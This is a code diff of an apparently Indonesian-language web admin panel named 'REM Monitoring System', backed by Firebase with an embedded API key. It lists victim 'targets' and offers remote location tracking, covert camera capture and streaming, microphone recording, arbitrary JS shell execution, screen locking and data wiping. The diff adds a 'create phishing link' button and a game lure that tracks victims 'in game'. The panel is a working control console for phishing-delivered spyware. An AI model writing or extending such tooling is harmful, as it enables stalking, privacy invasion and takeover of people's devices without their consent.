@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dashboard - Monitoring System</title>
+    <title>Dashboard - REM Monitoring System</title>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
@@ -19,19 +19,23 @@
             --red: #f85149;
             --yellow: #d2991d;
             --orange: #ff8c00;
+            --purple: #bc8cff;
         }
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             background: var(--bg);
             color: var(--text);
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            font-size: 14px;
+            font-size: 13px;
             line-height: 1.5;
+            overflow: hidden;
         }
         .app { display: flex; height: 100vh; }
         
+        /* Sidebar */
         .sidebar {
-            width: 320px;
+            width: 350px;
+            min-width: 350px;
             background: var(--card);
             border-right: 1px solid var(--border);
             display: flex;
@@ -39,15 +43,24 @@
             overflow: hidden;
         }
         .sidebar-header {
-            padding: 16px;
+            padding: 14px 16px;
             border-bottom: 1px solid var(--border);
             display: flex;
             align-items: center;
-            gap: 8px;
+            justify-content: space-between;
         }
-        .logo { font-size: 20px; font-weight: 700; color: #fff; }
-        .badge { background: var(--green); color: #000; font-size: 11px; padding: 2px 8px; border-radius: 10px; font-weight: 600; }
-        .search-box { padding: 12px 16px; border-bottom: 1px solid var(--border); }
+        .logo { font-size: 17px; font-weight: 700; color: #fff; }
+        .logo span { color: var(--accent); }
+        .badge-row { display: flex; gap: 6px; }
+        .badge {
+            font-size: 10px;
+            padding: 3px 8px;
+            border-radius: 10px;
+            font-weight: 600;
+        }
+        .badge.green { background: #1a3a1a; color: var(--green); border: 1px solid var(--green); }
+        .badge.purple { background: #1a1a3a; color: var(--purple); border: 1px solid var(--purple); }
+        .search-box { padding: 10px 16px; border-bottom: 1px solid var(--border); }
         .search-box input {
             width: 100%;
             background: var(--bg);
@@ -55,58 +68,95 @@
             color: var(--text);
             padding: 8px 12px;
             border-radius: 6px;
-            font-size: 13px;
+            font-size: 12px;
         }
         .search-box input:focus { outline: none; border-color: var(--accent); }
-        .device-list { flex: 1; overflow-y: auto; padding: 8px; }
+        
+        .tabs { display: flex; border-bottom: 1px solid var(--border); }
+        .tab {
+            flex: 1;
+            padding: 10px;
+            text-align: center;
+            cursor: pointer;
+            font-size: 12px;
+            font-weight: 600;
+            color: #8b949e;
+            border-bottom: 2px solid transparent;
+            transition: all 0.2s;
+        }
+        .tab:hover { color: #fff; }
+        .tab.active { color: var(--accent); border-bottom-color: var(--accent); }
+        
+        .device-list { flex: 1; overflow-y: auto; padding: 6px; }
+        .device-list::-webkit-scrollbar { width: 3px; }
+        .device-list::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }
+        
         .device-card {
             background: var(--bg);
             border: 1px solid var(--border);
             border-radius: 8px;
-            padding: 12px;
-            margin-bottom: 8px;
+            padding: 10px 12px;
+            margin-bottom: 5px;
             cursor: pointer;
             transition: all 0.2s;
             position: relative;
         }
-        .device-card:hover { border-color: var(--accent); }
+        .device-card:hover { border-color: #58a6ff88; }
         .device-card.selected { border-color: var(--accent); background: #1a2332; }
-        .device-card .name { font-weight: 600; color: #fff; font-size: 15px; }
-        .device-card .meta { font-size: 12px; color: #8b949e; margin-top: 4px; }
+        .device-card .name-row { display: flex; align-items: center; gap: 8px; margin-bottom: 4px; }
+        .device-card .name { font-weight: 600; color: #fff; font-size: 14px; flex: 1; }
+        .device-card .game-badge {
+            font-size: 9px;
+            padding: 2px 6px;
+            border-radius: 4px;
+            background: #1a3a1a;
+            color: var(--green);
+            border: 1px solid var(--green);
+            display: none;
+        }
+        .device-card .game-badge.playing { display: inline-block; }
+        .device-card .meta { font-size: 10px; color: #8b949e; display: flex; gap: 10px; flex-wrap: wrap; }
         .device-card .dot {
-            width: 8px; height: 8px;
+            width: 7px; height: 7px;
             border-radius: 50%;
             position: absolute;
-            top: 12px; right: 12px;
+            top: 14px; right: 14px;
         }
-        .dot.online { background: var(--green); box-shadow: 0 0 8px var(--green); }
+        .dot.online { background: var(--green); box-shadow: 0 0 6px var(--green); animation: dotPulse 2s infinite; }
         .dot.offline { background: var(--red); }
-        .device-card .error-indicator {
+        @keyframes dotPulse {
+            0%, 100% { box-shadow: 0 0 3px var(--green); }
+            50% { box-shadow: 0 0 12px var(--green); }
+        }
+        .device-card .warn-icon {
             position: absolute;
-            top: 12px; right: 28px;
+            top: 14px; right: 28px;
             color: var(--orange);
-            font-size: 12px;
+            font-size: 10px;
             display: none;
         }
         
+        /* Main */
         .main { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
         .topbar {
-            padding: 12px 20px;
+            padding: 8px 20px;
             border-bottom: 1px solid var(--border);
             display: flex;
             align-items: center;
             justify-content: space-between;
             background: var(--card);
+            min-height: 44px;
         }
-        .topbar h2 { font-size: 18px; font-weight: 600; color: #fff; }
+        .topbar h2 { font-size: 15px; font-weight: 600; color: #fff; }
+        .topbar .actions { display: flex; gap: 6px; }
         .btn {
-            padding: 6px 14px;
+            padding: 5px 12px;
             border: 1px solid var(--border);
             background: var(--bg);
             color: var(--text);
-            border-radius: 6px;
+            border-radius: 5px;
             cursor: pointer;
-            font-size: 13px;
+            font-size: 11px;
             transition: all 0.2s;
             white-space: nowrap;
         }
@@ -115,49 +165,59 @@
         .btn.primary:hover { background: #2ea043; }
         .btn.danger { background: #da3633; border-color: #da3633; color: #fff; }
         .btn.danger:hover { background: #f85149; }
-        .btn.warn { background: #9a6700; border-color: #d2991d; color: #fff; }
-        .btn.small { padding: 3px 10px; font-size: 11px; }
+        .btn.warn { background: #9a6700; border-color: var(--yellow); color: #fff; }
+        .btn.accent { background: #1a3a5c; border-color: var(--accent); color: #fff; }
+        .btn.small { padding: 3px 8px; font-size: 10px; }
+        .btn:active { transform: scale(0.95); }
         
         .content {
             flex: 1;
             overflow-y: auto;
-            padding: 20px;
+            padding: 14px;
             display: grid;
             grid-template-columns: 1fr 1fr;
-            gap: 16px;
+            gap: 10px;
+            align-content: start;
         }
+        .content::-webkit-scrollbar { width: 3px; }
+        .content::-webkit-scrollbar-thumb { background: var(--border); }
+        
         .card {
             background: var(--card);
             border: 1px solid var(--border);
             border-radius: 8px;
-            padding: 16px;
+            padding: 12px;
         }
-        .card.full { grid-column: 1 / -1; }
+        .card.span-2 { grid-column: 1 / -1; }
         .card-header {
             display: flex;
             align-items: center;
             justify-content: space-between;
-            margin-bottom: 12px;
-            padding-bottom: 8px;
+            margin-bottom: 8px;
+            padding-bottom: 6px;
             border-bottom: 1px solid var(--border);
         }
-        .card-header h3 { font-size: 14px; font-weight: 600; color: #fff; }
+        .card-header h3 { font-size: 12px; font-weight: 600; color: #fff; }
+        .card-header .sub { font-size: 10px; color: #8b949e; }
         
-        #map { height: 280px; border-radius: 6px; border: 1px solid var(--border); }
-        .info-row { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 6px; }
+        #map { height: 220px; border-radius: 6px; border: 1px solid var(--border); }
+        .info-row { display: flex; gap: 6px; flex-wrap: wrap; margin-bottom: 4px; }
         .info-tag {
             background: var(--bg);
             border: 1px solid var(--border);
-            padding: 3px 10px;
+            padding: 2px 8px;
             border-radius: 4px;
-            font-size: 12px;
+            font-size: 10px;
         }
         .info-tag span { color: #8b949e; }
         .info-tag strong { color: #fff; }
+        .info-tag .ok { color: var(--green); }
+        .info-tag .fail { color: var(--red); }
+        .info-tag .warn { color: var(--yellow); }
         
         .camera-area {
             text-align: center;
-            min-height: 200px;
+            min-height: 160px;
             display: flex;
             align-items: center;
             justify-content: center;
@@ -167,163 +227,300 @@
             overflow: hidden;
             position: relative;
         }
-        .camera-area img, .camera-area video {
-            max-width: 100%;
-            max-height: 260px;
-            border-radius: 6px;
-        }
+        .camera-area img { max-width: 100%; max-height: 220px; border-radius: 4px; }
+        .camera-area .placeholder { color: #8b949e; font-size: 11px; }
         
         .log-box {
             background: #000;
             border: 1px solid var(--border);
             border-radius: 6px;
-            padding: 10px;
-            height: 180px;
+            padding: 8px;
+            height: 150px;
             overflow-y: auto;
-            font-size: 12px;
-            font-family: 'SF Mono', 'Fira Code', monospace;
+            font-size: 10px;
+            font-family: 'SF Mono', 'Fira Code', 'Consolas', monospace;
             color: #7ee787;
+            line-height: 1.6;
         }
-        .log-box .entry { margin-bottom: 3px; }
+        .log-box .entry { margin-bottom: 1px; word-break: break-all; }
         .log-box .time { color: #8b949e; }
         .log-box .warn { color: var(--orange); }
         .log-box .error { color: var(--red); }
+        .log-box .info { color: var(--accent); }
+        .log-box .game { color: var(--purple); }
+        .log-box::-webkit-scrollbar { width: 2px; }
+        .log-box::-webkit-scrollbar-thumb { background: var(--border); }
         
-        .notif-toast {
-            position: fixed;
-            bottom: 20px; right: 20px;
-            padding: 12px 20px;
-            border-radius: 8px;
-            color: #fff;
-            font-weight: 600;
-            z-index: 9999;
-            animation: slideIn 0.3s ease;
-            max-width: 380px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+        .game-stats {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 6px;
+            text-align: center;
         }
-        .notif-toast.success { background: #238636; border: 1px solid #3fb950; }
-        .notif-toast.error { background: #da3633; border: 1px solid #f85149; }
-        .notif-toast.warning { background: #9a6700; border: 1px solid #d2991d; }
+        .stat-item {
+            background: var(--bg);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            padding: 8px;
+        }
+        .stat-value { font-size: 20px; font-weight: 700; color: #fff; }
+        .stat-label { font-size: 9px; color: #8b949e; text-transform: uppercase; }
+        .stat-value.red { color: var(--red); }
+        .stat-value.green { color: var(--green); }
+        .stat-value.purple { color: var(--purple); }
+        
+        /* Toast */
+        #toastContainer {
+            position: fixed;
+            bottom: 12px; right: 12px;
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            max-width: 360px;
+        }
+        .toast {
+            padding: 8px 14px;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 12px;
+            font-weight: 600;
+            animation: slideIn 0.3s ease;
+            box-shadow: 0 4px 16px rgba(0,0,0,0.5);
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            cursor: pointer;
+        }
+        .toast.success { background: #1a3a1a; border: 1px solid var(--green); }
+        .toast.error { background: #3a1a1a; border: 1px solid var(--red); }
+        .toast.warning { background: #3a2a0a; border: 1px solid var(--yellow); }
+        .toast.info { background: #1a2a3a; border: 1px solid var(--accent); }
+        .toast.game { background: #2a1a3a; border: 1px solid var(--purple); }
         @keyframes slideIn {
-            from { transform: translateX(100%); opacity: 0; }
+            from { transform: translateX(120%); opacity: 0; }
             to { transform: translateX(0); opacity: 1; }
         }
         
-        .cmd-row { display: flex; gap: 6px; margin-bottom: 8px; flex-wrap: wrap; }
+        .cmd-row { display: flex; gap: 5px; margin-bottom: 5px; flex-wrap: wrap; align-items: center; }
         .cmd-row input {
             flex: 1;
-            min-width: 100px;
+            min-width: 80px;
             background: var(--bg);
             border: 1px solid var(--border);
             color: var(--text);
-            padding: 6px 10px;
+            padding: 4px 8px;
             border-radius: 4px;
-            font-size: 12px;
+            font-size: 11px;
         }
         .cmd-row input:focus { outline: none; border-color: var(--accent); }
         
-        .empty-state { text-align: center; padding: 60px 20px; color: #8b949e; }
+        .empty-state { 
+            text-align: center; 
+            padding: 60px 20px; 
+            color: #8b949e;
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+        }
+        .empty-state .icon { font-size: 48px; margin-bottom: 10px; }
+        
+        .modal-overlay {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.8);
+            z-index: 999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .modal {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 20px;
+            max-width: 480px;
+            width: 90%;
+        }
+        .modal h3 { color: #fff; margin-bottom: 6px; }
+        .modal p { color: #8b949e; font-size: 12px; margin-bottom: 10px; }
+        .modal input {
+            width: 100%;
+            background: var(--bg);
+            border: 1px solid var(--border);
+            color: var(--text);
+            padding: 7px 10px;
+            border-radius: 4px;
+            font-size: 12px;
+            margin-bottom: 6px;
+        }
+        
+        @media (max-width: 900px) {
+            .app { flex-direction: column; }
+            .sidebar { width: 100%; min-width: 100%; max-height: 35vh; }
+            .content { grid-template-columns: 1fr; }
+        }
     </style>
 </head>
 <body>
     <div class="app">
+        <!-- Sidebar -->
         <div class="sidebar">
             <div class="sidebar-header">
-                <span class="logo">📡 Dashboard</span>
-                <span class="badge" id="onlineCount">0 online</span>
+                <span class="logo">📡 <span>REM</span> Panel</span>
+                <div class="badge-row">
+                    <span class="badge green" id="onlineCount">0</span>
+                    <span class="badge purple" id="gameCount">0 in game</span>
+                </div>
             </div>
             <div class="search-box">
-                <input type="text" placeholder="Cari device..." id="searchInput" oninput="filterDevices()" />
+                <input type="text" placeholder="🔍 Cari device / player..." id="searchInput" oninput="filterDevices()" autocomplete="off" />
+            </div>
+            <div class="tabs">
+                <div class="tab active" onclick="switchTab('all')">Semua</div>
+                <div class="tab" onclick="switchTab('game')">🎮 In Game</div>
+                <div class="tab" onclick="switchTab('online')">🟢 Online</div>
             </div>
             <div class="device-list" id="deviceList">
-                <div class="empty-state"><p>Belum ada device</p></div>
+                <div class="empty-state" style="padding:30px;">
+                    <div class="icon">📭</div>
+                    <p>Belum ada device</p>
+                </div>
             </div>
         </div>
         
+        <!-- Main -->
         <div class="main">
             <div class="topbar">
-                <h2 id="panelTitle">Pilih device</h2>
+                <h2 id="panelTitle">👈 Pilih device</h2>
                 <div class="actions">
-                    <button class="btn" onclick="showLinkModal()">🔗 Link</button>
+                    <button class="btn accent" onclick="showLinkModal()">🔗 Link Baru</button>
                     <button class="btn primary" onclick="refreshAll()">🔄 Refresh</button>
+                    <button class="btn warn" onclick="clearLogs()">🗑 Clear Log</button>
                 </div>
             </div>
+            
             <div class="content" id="detailContent" style="display:none;">
+                <!-- Info Device -->
                 <div class="card">
                     <div class="card-header">
-                        <h3>📱 Info</h3>
-                        <button class="btn small" onclick="requestUpdate()">Update</button>
+                        <h3>📱 Info Device</h3>
+                        <button class="btn small" onclick="requestUpdate()">⟳ Update</button>
                     </div>
-                    <div id="deviceInfo"></div>
+                    <div id="deviceInfo">-</div>
                 </div>
+                
+                <!-- Game Stats (muncul kalau lagi main) -->
+                <div class="card" id="gameStatsCard" style="display:none;">
+                    <div class="card-header">
+                        <h3>🎮 Status Game</h3>
+                        <span class="sub" id="gamePlayerName">-</span>
+                    </div>
+                    <div class="game-stats">
+                        <div class="stat-item">
+                            <div class="stat-value red" id="statEnemyHP">5500</div>
+                            <div class="stat-label">HP Boss</div>
+                        </div>
+                        <div class="stat-item">
+                            <div class="stat-value green" id="statPlayerHP">5000</div>
+                            <div class="stat-label">HP Player</div>
+                        </div>
+                        <div class="stat-item">
+                            <div class="stat-value purple" id="statPlayers">1</div>
+                            <div class="stat-label">Pemain Online</div>
+                        </div>
+                    </div>
+                    <div id="gameStatusText" style="font-size:10px;color:#8b949e;margin-top:6px;text-align:center;">-</div>
+                </div>
+                
+                <!-- Map -->
                 <div class="card">
                     <div class="card-header">
                         <h3>📍 Lokasi</h3>
                         <div>
                             <button class="btn small primary" id="trackBtn" onclick="toggleTracking()">▶ Track</button>
-                            <button class="btn small" onclick="refreshLocation()">Refresh</button>
+                            <button class="btn small" onclick="refreshLocation()">⟳</button>
                         </div>
                     </div>
                     <div id="map"></div>
-                    <div id="locText" style="font-size:12px;margin-top:6px;">-</div>
+                    <div id="locText" style="font-size:10px;margin-top:4px;color:#8b949e;">-</div>
                 </div>
+                
+                <!-- Kamera -->
                 <div class="card">
                     <div class="card-header">
                         <h3>📸 Kamera</h3>
                         <div>
-                            <button class="btn small" onclick="capturePhoto('user')">Selfie</button>
-                            <button class="btn small" onclick="capturePhoto('environment')">Belakang</button>
-                            <button class="btn small primary" onclick="toggleVideoStream()">Stream</button>
+                            <button class="btn small" onclick="capturePhoto('user')">🤳 Selfie</button>
+                            <button class="btn small" onclick="capturePhoto('environment')">📷 Belakang</button>
+                            <button class="btn small primary" id="streamBtn" onclick="toggleVideoStream()">▶ Stream</button>
                         </div>
                     </div>
                     <div class="camera-area" id="cameraArea">
-                        <span style="color:#8b949e;">Klik tombol ambil gambar</span>
+                        <span class="placeholder">Klik Selfie / Belakang</span>
                     </div>
                 </div>
+                
+                <!-- Audio -->
                 <div class="card">
                     <div class="card-header">
                         <h3>🎤 Audio</h3>
                         <div>
                             <button class="btn small" id="micBtn" onclick="toggleMic()">▶ Rekam</button>
-                            <button class="btn small" onclick="downloadAudio()">Unduh</button>
+                            <button class="btn small" onclick="downloadAudio()">⬇ Unduh</button>
                         </div>
                     </div>
-                    <div id="micStatus" style="font-size:12px;margin-bottom:6px;">Mikrofon idle</div>
-                    <div class="log-box" id="audioLog">Menunggu...</div>
+                    <div id="micStatus" style="font-size:11px;margin-bottom:4px;">Mikrofon idle</div>
+                    <div class="log-box" id="audioLog" style="height:80px;">Menunggu...</div>
                 </div>
-                <div class="card full">
-                    <div class="card-header"><h3>⚡ Actions</h3></div>
+                
+                <!-- Quick Actions -->
+                <div class="card span-2">
+                    <div class="card-header"><h3>⚡ Quick Actions</h3></div>
                     <div class="cmd-row">
-                        <button class="btn small" onclick="sendNotif()">Notifikasi</button>
-                        <input type="text" id="notifTitle" placeholder="Judul" style="max-width:130px;" />
-                        <input type="text" id="notifBody" placeholder="Pesan" style="max-width:200px;" />
+                        <button class="btn small" onclick="sendNotif()">📢 Notif</button>
+                        <input type="text" id="notifTitle" placeholder="Judul" style="max-width:120px;" />
+                        <input type="text" id="notifBody" placeholder="Pesan..." style="max-width:180px;" />
                     </div>
                     <div class="cmd-row">
-                        <button class="btn small" onclick="openUrl()">Buka URL</button>
+                        <button class="btn small" onclick="openUrl()">🌐 URL</button>
                         <input type="text" id="urlInput" placeholder="https://..." />
+                        <button class="btn small" onclick="execShell()">💻 Shell</button>
+                        <input type="text" id="shellInput" placeholder="Perintah JS..." />
                     </div>
-                    <div class="cmd-row" style="border-top:1px solid var(--border);padding-top:8px;">
-                        <button class="btn small danger" onclick="lockScreen()">Kunci</button>
-                        <button class="btn small" onclick="vibratePhone()">Getar</button>
-                        <button class="btn small danger" onclick="wipeConfirm()">Hapus Data</button>
+                    <div class="cmd-row" style="border-top:1px solid var(--border);padding-top:6px;margin-top:4px;">
+                        <button class="btn small danger" onclick="lockScreen()">🔒 Kunci</button>
+                        <button class="btn small" onclick="vibratePhone()">📳 Getar</button>
+                        <button class="btn small danger" onclick="wipeConfirm()">💀 Hapus</button>
                     </div>
                 </div>
-                <div class="card full">
-                    <div class="card-header"><h3>📋 Log & Error</h3></div>
+                
+                <!-- Log -->
+                <div class="card span-2">
+                    <div class="card-header">
+                        <h3>📋 Activity Log</h3>
+                        <span style="font-size:10px;color:#8b949e;" id="logCount">0</span>
+                    </div>
                     <div class="log-box" id="activityLog"></div>
-                    <div id="errorAlerts" style="margin-top:8px;"></div>
                 </div>
             </div>
-            <div class="empty-state" id="emptyMain" style="margin-top:80px;">
-                <p>👈 Pilih device dari sidebar</p>
+            
+            <div class="empty-state" id="emptyMain">
+                <div class="icon">📡</div>
+                <p>REM Monitoring Panel</p>
+                <small>Pilih device dari sidebar</small>
+                <button class="btn primary" style="margin-top:12px;" onclick="showLinkModal()">🔗 Buat Link Phishing</button>
             </div>
         </div>
     </div>
     
-    <!-- Toast container -->
     <div id="toastContainer"></div>
     
     <script>
+        console.log('🔥 ADMIN PANEL LOADED - REM V4');
+        
         firebase.initializeApp({
             apiKey: "AIzaSyAlMyO9iybb7Zc3-JWpaJTOU6mp7dVZw7A",
             authDomain: "taher-online.firebaseapp.com",
@@ -336,49 +533,84 @@
         
         const db = firebase.database();
         let currentTarget = null;
+        let currentTab = 'all';
         let map = null;
         let marker = null;
         let trackingActive = false;
+        let videoActive = false;
+        let micActive = false;
         let allDevices = {};
+        let allPlayers = {};
+        let gameStates = {};
+        let photoListener = null;
+        let audioListener = null;
+        let videoFrameListener = null;
+        let gameStateListener = null;
         
-        function toast(msg, type = 'success') {
+        // ============ TOAST ============
+        function toast(msg, type = 'info', duration = 3500) {
             const container = document.getElementById('toastContainer');
+            const icons = { success: '✅', error: '❌', warning: '⚠️', info: 'ℹ️', game: '🎮' };
             const el = document.createElement('div');
-            el.className = `notif-toast ${type}`;
-            el.textContent = msg;
+            el.className = `toast ${type}`;
+            el.innerHTML = `${icons[type] || ''} ${msg}`;
+            el.onclick = () => el.remove();
             container.appendChild(el);
-            setTimeout(() => { el.remove(); }, 4000);
+            setTimeout(() => { if (el.parentNode) el.remove(); }, duration);
         }
         
+        // ============ LOG ============
         function addLog(msg, type = '') {
             const el = document.getElementById('activityLog');
             const time = new Date().toLocaleTimeString();
             el.innerHTML += `<div class="entry ${type}"><span class="time">[${time}]</span> ${msg}</div>`;
             el.scrollTop = el.scrollHeight;
+            updateLogCount();
+        }
+        function clearLogs() {
+            document.getElementById('activityLog').innerHTML = '';
+            updateLogCount();
+            toast('Log cleared', 'info', 1500);
+        }
+        function updateLogCount() {
+            const count = document.getElementById('activityLog').querySelectorAll('.entry').length;
+            document.getElementById('logCount').textContent = `${count} entries`;
         }
         
-        function loadDevices() {
+        // ============ LOAD DATA ============
+        function loadAllData() {
+            // Load targets
             db.ref('targets').on('value', (snap) => {
                 allDevices = snap.val() || {};
                 renderDeviceList();
-                updateOnlineCount();
-                checkAllErrors();
+                updateCounts();
+                if (currentTarget && allDevices[currentTarget]) {
+                    updateDeviceDetailUI(allDevices[currentTarget]);
+                }
             });
-        }
-        
-        function checkAllErrors() {
-            Object.entries(allDevices).forEach(([id, d]) => {
-                if (d.locationError) {
-                    toast(`⚠️ ${d.name}: ${d.locationError}`, 'warning');
+            
+            // Load players (dari game)
+            db.ref('players').on('value', (snap) => {
+                allPlayers = snap.val() || {};
+                renderDeviceList();
+                updateCounts();
+            });
+            
+            // Load game states
+            db.ref('gameState').on('value', (snap) => {
+                gameStates = snap.val() || {};
+                if (currentTarget) {
+                    updateGameStatsUI();
                 }
-                if (d.photoError) {
-                    toast(`⚠️ ${d.name}: Kamera error - ${d.photoError.message}`, 'error');
-                }
-                if (d.videoError) {
-                    toast(`⚠️ ${d.name}: Stream error - ${d.videoError.message}`, 'error');
-                }
-                if (d.micError) {
-                    toast(`⚠️ ${d.name}: Mic error - ${d.micError.message}`, 'error');
+            });
+            
+            // Load skill events
+            db.ref('skillEvents').on('child_added', (snap) => {
+                const evt = snap.val();
+                if (evt.type === 'thunder') {
+                    addLog(`⚡ Petir dari ${evt.playerId} di game`, 'game');
+                } else if (evt.type === 'enemy_explosion') {
+                    addLog(`💥 Boss explosion di game!`, 'game');
                 }
             });
         }
@@ -386,84 +618,161 @@
         function renderDeviceList(filter = '') {
             const container = document.getElementById('deviceList');
             const devices = Object.entries(allDevices);
-            const filtered = devices.filter(([id, d]) => 
-                !filter || (d.name || '').toLowerCase().includes(filter.toLowerCase())
-            );
+            
+            let filtered = devices.filter(([id, d]) => {
+                const nameMatch = !filter || (d.name || '').toLowerCase().includes(filter.toLowerCase());
+                
+                if (currentTab === 'game') {
+                    return nameMatch && d.gameConnected === true;
+                } else if (currentTab === 'online') {
+                    return nameMatch && d.online === true;
+                }
+                return nameMatch;
+            });
             
             if (filtered.length === 0) {
-                container.innerHTML = `<div class="empty-state"><p>Tidak ada device</p></div>`;
+                container.innerHTML = `<div class="empty-state" style="padding:30px;"><p>Tidak ada device</p></div>`;
                 return;
             }
             
             container.innerHTML = filtered.map(([id, d]) => {
                 const hasError = d.locationError || d.photoError || d.videoError || d.micError;
+                const inGame = d.gameConnected === true;
+                const playerData = allPlayers[id];
+                
                 return `
                 <div class="device-card ${currentTarget === id ? 'selected' : ''}" onclick="selectDevice('${id}')">
                     <div class="dot ${d.online ? 'online' : 'offline'}"></div>
-                    <span class="error-indicator" style="display:${hasError ? 'inline' : 'none'}">⚠️</span>
-                    <div class="name">${d.name || 'Unknown'}</div>
+                    <span class="warn-icon" style="display:${hasError ? 'inline' : 'none'}">⚠️</span>
+                    <div class="name-row">
+                        <span class="name">${escapeHTML(d.name || 'Unknown')}</span>
+                        <span class="game-badge ${inGame ? 'playing' : ''}">🎮 IN GAME</span>
+                    </div>
                     <div class="meta">
-                        <span>📱 ${d.deviceModel || 'N/A'}</span>
-                        <span>🌐 ${d.ip || '-'}</span>
+                        <span>📱 ${escapeHTML(d.deviceModel || '?')}</span>
+                        <span>🌐 ${d.ip || '?'}</span>
                     </div>
                     <div class="meta">
                         <span>🕐 ${d.lastSeen || '-'}</span>
                         <span>🔋 ${d.battery || '?'}%</span>
+                        ${inGame ? '<span style="color:#bc8cff;">🎮 Playing</span>' : ''}
                     </div>
-                </div>
-                `;
+                </div>`;
             }).join('');
+        }
+        
+        function escapeHTML(str) {
+            const div = document.createElement('div');
+            div.textContent = str;
+            return div.innerHTML;
+        }
+        
+        function switchTab(tab) {
+            currentTab = tab;
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            event.target.classList.add('active');
+            filterDevices();
         }
         
         function filterDevices() {
             renderDeviceList(document.getElementById('searchInput').value);
         }
         
-        function updateOnlineCount() {
+        function updateCounts() {
             const online = Object.values(allDevices).filter(d => d.online).length;
+            const inGame = Object.values(allDevices).filter(d => d.gameConnected).length;
             document.getElementById('onlineCount').textContent = `${online} online`;
+            document.getElementById('gameCount').textContent = `${inGame} in game`;
         }
         
+        // ============ SELECT DEVICE ============
         function selectDevice(id) {
+            cleanupListeners();
+            
             currentTarget = id;
             const d = allDevices[id];
             if (!d) return;
             
             document.getElementById('detailContent').style.display = 'grid';
             document.getElementById('emptyMain').style.display = 'none';
-            document.getElementById('panelTitle').textContent = d.name || 'Device';
+            document.getElementById('panelTitle').textContent = `📱 ${d.name || 'Device'}`;
             
+            // Reset UI
+            document.getElementById('cameraArea').innerHTML = '<span class="placeholder">Klik Selfie / Belakang</span>';
+            document.getElementById('audioLog').innerHTML = 'Menunggu...';
+            document.getElementById('micStatus').textContent = 'Mikrofon idle';
+            document.getElementById('micBtn').textContent = '▶ Rekam';
+            document.getElementById('streamBtn').textContent = '▶ Stream';
+            micActive = false;
+            videoActive = false;
+            trackingActive = false;
+            document.getElementById('trackBtn').textContent = '▶ Track';
+            
+            updateDeviceDetailUI(d);
+            updateGameStatsUI();
+            renderDeviceList(document.getElementById('searchInput').value);
+            addLog(`📱 Select: <b>${escapeHTML(d.name)}</b> ${d.gameConnected ? '🎮 [IN GAME]' : ''}`, 'info');
+            
+            setupPhotoListener(id);
+            setupAudioListener(id);
+            setupErrorListeners(id);
+            
+            toast(`Connected to ${d.name}`, 'success', 2000);
+        }
+        
+        function updateDeviceDetailUI(d) {
             document.getElementById('deviceInfo').innerHTML = `
                 <div class="info-row">
-                    <span class="info-tag"><span>Model</span> <strong>${d.deviceModel || 'N/A'}</strong></span>
-                    <span class="info-tag"><span>OS</span> <strong>${d.deviceOS || 'N/A'}</strong></span>
+                    <span class="info-tag"><span>Model</span> <strong>${escapeHTML(d.deviceModel || 'N/A')}</strong></span>
+                    <span class="info-tag"><span>OS</span> <strong>${escapeHTML(d.deviceOS || 'N/A')}</strong></span>
                     <span class="info-tag"><span>IP</span> <strong>${d.ip || 'N/A'}</strong></span>
                 </div>
                 <div class="info-row">
                     <span class="info-tag"><span>Baterai</span> <strong>${d.battery || '?'}%</strong></span>
-                    <span class="info-tag"><span>Jaringan</span> <strong>${d.network || 'N/A'}</strong></span>
+                    <span class="info-tag"><span>Net</span> <strong>${d.network || 'N/A'}</strong></span>
+                    <span class="info-tag"><span>Layar</span> <strong>${d.screen || 'N/A'}</strong></span>
                 </div>
-                <div class="info-row" style="margin-top:8px;">
-                    <span class="info-tag">📍 <strong>${d.permissions?.location ? '✅' : '❌'}</strong></span>
-                    <span class="info-tag">📸 <strong>${d.permissions?.camera ? '✅' : '❌'}</strong></span>
-                    <span class="info-tag">🎤 <strong>${d.permissions?.microphone ? '✅' : '❌'}</strong></span>
+                <div class="info-row" style="margin-top:4px;">
+                    <span class="info-tag">📍 <strong class="${d.permissions?.location ? 'ok' : 'fail'}">${d.permissions?.location ? '✅' : '❌'}</strong></span>
+                    <span class="info-tag">📸 <strong class="${d.permissions?.camera ? 'ok' : 'fail'}">${d.permissions?.camera ? '✅' : '❌'}</strong></span>
+                    <span class="info-tag">🎤 <strong class="${d.permissions?.microphone ? 'ok' : 'fail'}">${d.permissions?.microphone ? '✅' : '❌'}</strong></span>
+                    <span class="info-tag">🎮 <strong class="${d.gameConnected ? 'ok' : 'warn'}">${d.gameConnected ? '✅ IN GAME' : '❌'}</strong></span>
                 </div>
             `;
             
             if (d.location && d.location.lat) {
                 initMap(d.location.lat, d.location.lon);
                 document.getElementById('locText').textContent = 
-                    `Lat: ${d.location.lat.toFixed(6)}, Lon: ${d.location.lon.toFixed(6)} · ±${d.location.accuracy || '?'}m`;
+                    `📍 ${d.location.lat.toFixed(6)}, ${d.location.lon.toFixed(6)} · ±${d.location.accuracy || '?'}m`;
             }
+        }
+        
+        function updateGameStatsUI() {
+            const card = document.getElementById('gameStatsCard');
+            const d = allDevices[currentTarget];
             
-            document.getElementById('cameraArea').innerHTML = '<span style="color:#8b949e;">Klik tombol ambil gambar</span>';
-            document.getElementById('audioLog').innerHTML = 'Menunggu...';
-            
-            renderDeviceList();
-            addLog(`Membuka: ${d.name}`);
-            listenPhoto(id);
